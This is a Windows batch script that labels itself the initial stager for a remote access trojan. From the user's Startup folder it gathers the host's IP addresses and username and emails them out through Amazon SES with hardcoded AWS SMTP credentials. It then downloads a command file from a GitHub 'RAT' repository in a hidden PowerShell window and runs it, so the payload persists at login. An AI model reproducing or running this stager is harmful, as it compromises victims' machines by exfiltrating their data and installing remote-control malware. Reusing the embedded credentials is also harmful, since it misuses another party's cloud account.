
@REM @echo off
@REM initial stager for RAT
@REM created by : Luke O'Sullivan

@REM variables
set "initialPath=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
@REM move into startup directory
cd %STARTUP%

@REM Set up SMTP
powershell -NoProfile -Command "$email='lukeosullivan123@gmail.com'; $smtpUser='AKIAU2UDJAPS6AGCQU55'; $smtpPass='BBoDj+7tIeYSc9nwA+gmDyR1+tr8sR+EEdqPkX46exSi'; $ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.254*' -and $_.IPAddress -notlike '127.*' }).IPAddress -join ', '; $subject=\"$env:UserName logs\"; $msg=New-Object System.Net.Mail.MailMessage; $msg.From=$email; $msg.To.Add($email); $msg.Subject=$subject; $msg.Body=$ip; $smtp=New-Object System.Net.Mail.SmtpClient('email-smtp.eu-west-1.amazonaws.com',587); $smtp.EnableSsl=$true; $smtp.UseDefaultCredentials=$false; $smtp.DeliveryMethod=[System.Net.Mail.SmtpDeliveryMethod]::Network; $smtp.Credentials=New-Object System.Net.NetworkCredential($smtpUser,$smtpPass); $smtp.Send($msg)"


pause
@REM writeS payload to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wget.cmd -OutFile wget.cmd"


@REM run payload placeholder
powershell ./wget.cmd


@REM cd %initialPath%
@REM del init.cmd
